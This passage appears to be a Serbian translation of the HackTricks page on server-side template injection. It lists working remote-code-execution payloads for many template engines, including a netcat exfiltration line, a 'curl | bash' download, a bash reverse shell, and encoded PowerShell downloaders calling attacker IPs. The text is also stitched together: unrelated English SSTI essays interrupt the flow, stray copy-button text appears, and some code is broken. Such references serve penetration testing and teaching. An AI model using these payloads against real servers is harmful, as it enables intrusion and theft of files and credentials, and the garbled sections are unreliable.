Twig tako캠e podr쬬va Server-Side Template Injection (SSTI) ranjivosti, koje mogu biti iskori코캖ene za izvr코avanje proizvoljnog koda na serveru. Ove ranjivosti se obi캜no javljaju kada se korisni캜ki unos nepravilno tretira kao deo Twig 코ablona, 코to omogu캖ava napada캜u da ubaci zlonamerni kod koji 캖e biti izvr코en prilikom renderovanja 코ablona.

Da biste iskoristili SSTI ranjivost u Twig formatu, potrebno je prona캖i mesto gde se korisni캜ki unos ubacuje direktno u 코ablon. Zatim, mo쬰te koristiti Twig sintaksu za ubacivanje i izvr코avanje proizvoljnog koda. Na primer, mo쬰te koristiti `{{ exec('ls') }}` da biste izvr코ili komandu `ls` na serveru i prikazali rezultate.

Kada se susretnete sa SSTI ranjivo코캖u u Twig formatu, va쬹o je biti oprezan i pa쬷jivo tretirati korisni캜ki unos. Preporu캜uje se sanitizacija i validacija korisni캜kog unosa pre nego 코to se ubaci u 코ablon kako bi se spre캜ilo izvr코avanje zlonamernog koda.

U nastavku su prikazani neki primeri Twig sintakse koja se mo쬰 koristiti za iskori코캖avanje SSTI ranjivosti:

- `{{ 7*'7' }}` - Izra캜unava rezultat mno쬰nja broja 7 sa stringom '7'.
- `{{ config }}` - Prikazuje konfiguraciju aplikacije.
- `{{ app.request.server.get('SERVER_SOFTWARE') }}` - Prikazuje verziju servera.
- `{{ app.user }}` - Prikazuje informacije o trenutno prijavljenom korisniku.

Kada se koristi Twig format 코ablona, va쬹o je biti svestan potencijalnih SSTI ranjivosti i preduzeti odgovaraju캖e mere za코tite kako bi se spre캜ilo zloupotrebljavanje.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**Vi코e informacija**

* U odeljku Twig i Twig (Sandboxed) na [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates je 코ablon-motor koji je ugra캠en u PHP, inspirisan Twig-om. Me캠utim, za razliku od Twig-a, koji uvodi novu sintaksu, Plates koristi ugra캠eni PHP kod u 코ablonima, 코to ga 캜ini intuitivnim za PHP programere.

Kontroler:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
마blon stranice:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
마blon rasporeda:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**Vi코e informacija**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlib i HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) je isto 코to i PHPlib, ali preba캜en na Pear.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# Server-Side Template Injection (SSTI)

## Description

Server-Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a server-side template, which is then executed by the server. This can lead to remote code execution (RCE) and other serious security issues.

## Exploitation

To exploit SSTI, an attacker needs to identify a vulnerable server-side template and inject their own code into it. This can be done by manipulating user input that is directly used in the template, such as template variables or template tags.

Once the malicious code is injected, it will be executed by the server, allowing the attacker to perform various actions depending on the server's capabilities. This can include reading sensitive data, modifying server-side files, or even gaining full control over the server.

## Prevention

To prevent SSTI vulnerabilities, it is important to follow secure coding practices:

- **Input validation and sanitization**: Always validate and sanitize user input before using it in server-side templates. This can help prevent code injection attacks.
- **Template sandboxing**: Use template engines that provide sandboxing capabilities. This can restrict the execution of certain dangerous operations within the template.
- **Least privilege principle**: Ensure that the server running the templates has the least privileges necessary to perform its intended functions. This can limit the impact of an SSTI vulnerability.

## Conclusion

Server-Side Template Injection is a serious vulnerability that can lead to remote code execution and other security issues. By following secure coding practices and regularly testing for SSTI vulnerabilities, developers can help protect their applications from this type of attack.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**Vi코e informacija**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Vi코e informacija**

* U odeljku Jade na [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) je PHP 코ablon-motor koji ne kompajlira kod, ve캖 koristi XML oznake za deljenje dokumenta na razli캜ite delove.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**Vi코e informacija**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

Putanja Traversal (vi코e informacija [ovde](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Gre코ka
* ${7\*7} = ${7\*7}
* Ni코ta
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**Vi코e informacija**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **마blon** | **Opis**                                |
| ---------- | --------------------------------------- |
|            | Evaluacija i prikaz rezultata            |
|            | Evaluacija i prikaz rezultata u HTML kodu|
|            | Komentar                                |
| i          | Dozvoljava kod (onemogu캖eno po default-u)|

* \= 49

**Klijentska strana**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Server Side**

**Server Side** (Server Side) je tehnika napada koja omogu캖ava ubacivanje i izvr코avanje koda na serverskoj strani aplikacije. Ova tehnika se 캜esto koristi za napade na aplikacije koje koriste server-side template engine, kao 코to su Jinja2, Twig, Freemarker, itd.

## Kako radi Server Side Template Injection (SSTI)?

Server Side Template Injection (SSTI) se javlja kada aplikacija dozvoljava korisnicima da unose podatke koji se kasnije koriste za generisanje dinami캜kog sadr쬬ja na serverskoj strani. Ako aplikacija ne pravilno validira ili filtrira korisni캜ki unos, napada캜 mo쬰 ubaciti zlonamerni kod koji 캖e biti izvr코en na serverskoj strani.

Napada캜 mo쬰 iskoristiti SSTI da bi izvr코io razli캜ite vrste napada, kao 코to su:

- **Izvr코avanje proizvoljnog koda**: Napada캜 mo쬰 ubaciti zlonamerni kod koji 캖e biti izvr코en na serverskoj strani, 코to mo쬰 dovesti do kompromitovanja celokupnog sistema.
- **Otkrivanje osetljivih informacija**: Napada캜 mo쬰 iskoristiti SSTI da bi pristupio osetljivim informacijama, kao 코to su lozinke, klju캜evi za pristup bazi podataka, ili druge poverljive informacije.
- **Napadi na sistem**: Napada캜 mo쬰 iskoristiti SSTI da bi izvr코io napade na serverski sistem, kao 코to su DoS (Denial of Service) napadi ili napadi na druge aplikacije koje se izvr코avaju na istom serveru.

## Kako spre캜iti Server Side Template Injection (SSTI)?

Da biste spre캜ili Server Side Template Injection (SSTI), trebali biste preduzeti slede캖e mere:

- **Validacija korisni캜kog unosa**: Pravilno validirajte i filtrirajte korisni캜ki unos kako biste spre캜ili ubacivanje zlonamernog koda.
- **Kori코캖enje sigurnih template engine-a**: Koristite template engine-e koji imaju ugra캠ene mehanizme za코tite od SSTI napada, kao 코to su Jinja2 sa "autoescape" pode코avanjem ili Twig sa "sandbox" re쬴mom.
- **Pravilno konfigurisanje servera**: Konfiguri코ite server tako da bude siguran i da primenjuje odgovaraju캖e bezbednosne mere, kao 코to su pravilno pode코avanje pristupa fajlovima i ograni캜avanje privilegija izvr코avanja koda.

## Zaklju캜ak

Server Side Template Injection (SSTI) je ozbiljna ranjivost koja mo쬰 dovesti do kompromitovanja serverske aplikacije i otkrivanja osetljivih informacija. Da biste se za코titili od SSTI napada, va쬹o je pravilno validirati korisni캜ki unos, koristiti sigurne template engine-e i pravilno konfigurisati server.
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Vi코e informacija**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Primer server-side renderovanja**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Vi코e informacija**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Nema izlaza
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Gre코ka
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Vi코e informacija**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Gre코ka`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Vi코e informacija**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Vi코e informacija**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Pogledajte slede캖u stranicu da biste nau캜ili trikove o **proizvoljnom izvr코avanju komandi zaobilaze캖i peskovnike** u pythonu:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}



{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Vi코e informacija**
* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[Zvani캜na veb stranica](http://jinja.pocoo.org)

> Jinja2 je potpuno opremljen 코ablonski motor za Python. Ima podr코ku za Unicode, opciono integrisano okru쬰nje za izvr코avanje u pesku, 코iroko se koristi i licenciran je pod BSD licencom.

* `{{7*7}} = Gre코ka`
* `${7*7} = ${7*7}`
* `{{foobar}} Ni코ta`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Format 코ablona**

Jinja2 je popularan jezik 코ablona koji se koristi za generisanje dinami캜kog sadr쬬ja u Python aplikacijama. Ovaj jezik 코ablona podr쬬va razli캜ite funkcionalnosti, uklju캜uju캖i Server-Side Template Injection (SSTI). SSTI je tehnika koja omogu캖ava napada캜u da ubaci i izvr코i svoj kod na serveru putem 코ablona.

**Kako funkcioni코e SSTI?**

Kada se koristi Jinja2, 코abloni se sastoje od HTML koda sa dodatnim oznakama koje ozna캜avaju mesta gde se ubacuju dinami캜ki podaci. Me캠utim, ako se nepravilno koristi, ova tehnika mo쬰 dovesti do SSTI ranjivosti.

Napada캜 mo쬰 iskoristiti SSTI ranjivost tako 코to 캖e ubaciti zlonamerni kod u 코ablon koji 캖e biti izvr코en na serveru. Ovo mo쬰 dovesti do ozbiljnih posledica, uklju캜uju캖i izvr코avanje proizvoljnog koda, otkrivanje osetljivih informacija ili 캜ak preuzimanje kontrole nad serverom.

**Identifikacija SSTI ranjivosti**

Da biste identifikovali SSTI ranjivost, mo쬰te poku코ati da ubacite jednostavne izraze u 코ablon i proverite da li se rezultat izvr코ava na serveru. Na primer, mo쬰te poku코ati da ubacite `{{7*7}}` i proveriti da li se rezultat `49` prikazuje na stranici.

Tako캠e, mo쬰te iskoristiti razli캜ite metode za identifikaciju SSTI ranjivosti, kao 코to su kori코캖enje specifi캜nih sintaksnih konstrukcija ili testiranje razli캜itih operatora.

**Eksploatacija SSTI ranjivosti**

Kada identifikujete SSTI ranjivost, mo쬰te je iskoristiti za izvr코avanje zlonamernog koda na serveru. Na primer, mo쬰te poku코ati da izvr코ite sistemsku komandu ili pristupite osetljivim podacima.

Da biste to postigli, mo쬰te koristiti razli캜ite tehnike, kao 코to su kori코캖enje funkcija sistema, pristup globalnim promenljivama ili kori코캖enje objekata koji su dostupni u okviru Jinja2.

**Prevencija SSTI ranjivosti**

Da biste spre캜ili SSTI ranjivosti, va쬹o je pravilno koristiti Jinja2 코ablone. Evo nekoliko mera koje mo쬰te preduzeti:

1. Validirajte i filtrirajte korisni캜ki unos kako biste spre캜ili ubacivanje zlonamernog koda.
2. Koristite sigurne metode za ubacivanje dinami캜kih podataka u 코ablone, kao 코to su `safe` filteri ili `escape` funkcije.
3. A쬿rirajte Jinja2 biblioteku na najnoviju verziju kako biste iskoristili sigurnosne ispravke.

Pravilno kori코캖enje Jinja2 코ablona klju캜no je za spre캜avanje SSTI ranjivosti i odr쬬vanje sigurnosti va코ih Python aplikacija.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE nezavisan od**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Vi코e detalja o zloupotrebi Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

Drugi payloadi na [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**Vi코e informacija**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= Uspeh`
* `@() <= Uspeh`
* `@("{{code}}") <= Uspeh`
* `@ <= Uspeh`
* `@{} <= GREKA!`
* `@{ <= GREKA!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA`Ow==");`

Metoda .NET `System.Diagnostics.Process.Start` mo쬰 se koristiti za pokretanje bilo kog procesa na serveru i tako stvoriti webshell. Mo쬰te prona캖i primer ranjive web aplikacije na [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**Vi코e informacija**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Ni코ta
* `<%= response.write(date()) %>` = \<Date>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Vi코e informacija**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

캛ak i ako je u pitanju Perl, koristi oznake poput ERB u Ruby-ju.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Gre코ka`
```
<%= perl code %>
<% perl code %>
```
### SSTI u GO-u

U Go-ovom template engine-u, potvrda kori코캖enja mo쬰 se izvr코iti sa odre캠enim payload-ima:

* `{{ . }}`: Otkriva strukturu unosa podataka. Na primer, ako se prosledi objekat sa atributom `Password`, `{{ .Password }}` bi moglo da ga otkrije.
* `{{printf "%s" "ssti" }}`: O캜ekuje se da prika쬰 string "ssti".
* `{{html "ssti"}}`, `{{js "ssti"}}`: Ovi payload-i bi trebalo da vrate "ssti" bez dodavanja "html" ili "js". Dodatne direktive mogu se istra쬴ti u Go dokumentaciji [ovde](https://golang.org/pkg/text/template).

**Eksploatacija XSS-a**

Sa paketom `text/template`, XSS mo쬰 biti jednostavan ubacivanjem payload-a direktno. Nasuprot tome, paket `html/template` enkodira odgovor kako bi spre캜io ovo (npr. `{{"<script>alert(1)</script>"}}` rezultira sa `&lt;script&gt;alert(1)&lt;/script&gt;`). Me캠utim, definisanje i pozivanje template-a u Go-u mo쬰 zaobi캖i ovaj enkodiranje:
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}

vbnet
Copy code

**Eksploatacija RCE-a**

Eksploatacija RCE-a se zna캜ajno razlikuje izme캠u `html/template` i `text/template`. Modul `text/template` omogu캖ava direktno pozivanje bilo koje javne funkcije (koriste캖i vrednost "call"), 코to nije dozvoljeno u `html/template`. Dokumentacija za ove module je dostupna [ovde za html/template](https://golang.org/pkg/html/template/) i [ovde za text/template](https://golang.org/pkg/text/template/).

Za RCE putem SSTI u Go-u, mogu se pozivati metode objekta. Na primer, ako obezbe캠eni objekat ima `System` metodu koja izvr코ava komande, mo쬰 se iskoristiti kao `{{ .System "ls" }}`. Obi캜no je potrebno pristupiti izvornom kodu da bi se ovo iskoristilo, kao u datom primeru:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**Vi코e informacija**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Vi코e eksploatacija

Proverite ostatak [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) za vi코e eksploatacija. Tako캠e mo쬰te prona캖i zanimljive informacije o oznakama na [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Povezana pomo캖

Ako mislite da bi moglo biti korisno, pro캜itajte:

* [Flask trikovi](../../network-services-pentesting/pentesting-web/flask.md)
* [Python magic funkcije](broken-reference/)

## Alati

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## Lista za otkrivanje Brute-Force napada

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Praksa i reference

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

귵**RootedCON**](https://www.rootedcon.com/) je najrelevantniji doga캠aj u vezi sa sajber bezbedno코캖u u **맗aniji** i jedan od najva쬹ijih u **Evropi**. Sa **misijom promovisanja tehni캜kog znanja**, ovaj kongres je vru캖a ta캜ka susreta za profesionalce iz oblasti tehnologije i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **ogla코avanje va코e kompanije na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
